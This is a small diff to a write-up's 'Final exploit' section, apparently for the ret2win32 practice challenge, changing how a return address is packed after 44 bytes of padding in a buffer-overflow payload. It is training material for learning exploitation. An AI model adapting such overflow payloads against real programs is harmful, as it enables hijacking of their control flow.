@@ -86,7 +86,7 @@ Final exploit:
   6 ret2win_addr = 0x08048659
   7 
   8 shellcode = ("A"*44).encode()
-  9 shellcode += struct.pack("I", ret2win_addr)
+  9 shellcode += struct.pack("<I", ret2win_addr)
  10 
  11 p = process('./ret2win32')
  12 
